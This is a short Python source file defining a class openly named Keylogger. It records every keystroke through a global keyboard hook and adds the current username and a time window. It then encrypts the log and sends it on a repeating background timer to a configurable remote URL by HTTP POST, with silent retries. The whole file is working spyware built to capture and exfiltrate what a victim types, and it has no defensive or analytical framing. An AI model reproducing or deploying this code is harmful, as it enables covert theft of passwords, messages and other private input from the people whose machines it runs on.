class Keylogger:
    def __init__(self, interval, POST_EXPECTED_RESULT, POST_KEY_NAME, POST_URL):
        self.interval = interval
        self.POST_EXPECTED_RESULT = POST_EXPECTED_RESULT
        self.POST_KEY_NAME = POST_KEY_NAME
        self.POST_URL = POST_URL
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def WebPOST(self):
        data = {f"{self.POST_KEY_NAME}": Cipher.encrypt(plain_text=self.log, key=16)}
        temp = 0
        while temp < 3:
            try:
                r = requests.post(self.POST_URL, data=data)
                if r.text == self.POST_EXPECTED_RESULT:
                    break
            except:
                pass
            temp += 1
        

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.log += str(getuser()) + f"\n{self.start_dt} - {self.end_dt}\n" 
            self.WebPOST()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()